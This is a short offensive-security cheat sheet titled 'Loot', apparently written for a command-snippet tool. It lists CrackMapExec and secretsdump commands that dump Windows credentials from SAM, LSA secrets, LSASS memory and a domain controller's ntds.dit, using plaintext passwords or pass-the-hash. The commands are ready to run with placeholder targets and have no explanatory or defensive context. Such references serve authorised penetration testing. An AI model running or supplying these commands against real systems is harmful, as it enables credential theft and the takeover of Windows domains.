# Loot

## Dump SAM (domain auth)

```
cme smb <target> -u <user> -p <password> -d <domain> --sam
```

= domain: $DOMAIN

## Dump SAM (local auth with hash)

```
cme smb <target> -u <user> -H <hash> --sam
```

## Dump LSA (domain auth)

```
cme smb <target> -u <user> -p <password> -d <domain> --lsa
```

= domain: $DOMAIN

## Dump LSA (local auth with hash)

```
cme smb <target> -u <user> -H <hash> --lsa
```

## Dump LSASS (domain auth)

```
cme smb <target> -u <user> -p <password> -d <domain> -M lsassy
```

= domain: $DOMAIN

## Dump LSASS (local auth)

```
cme smb <target> -u <user> -H <hash> -M lsassy
```

## Dump ntds.dit (domain auth) - cmme

```
cme smb <dc_ip> -u <user> -p <password> -d <domain> --ntds
```

= domain: $DOMAIN

## Dump ntds.dit (domain auth) - secretsdump

```
secretsdump '<domain>/<user>:<password>'@<ip>
```

= domain: $DOMAIN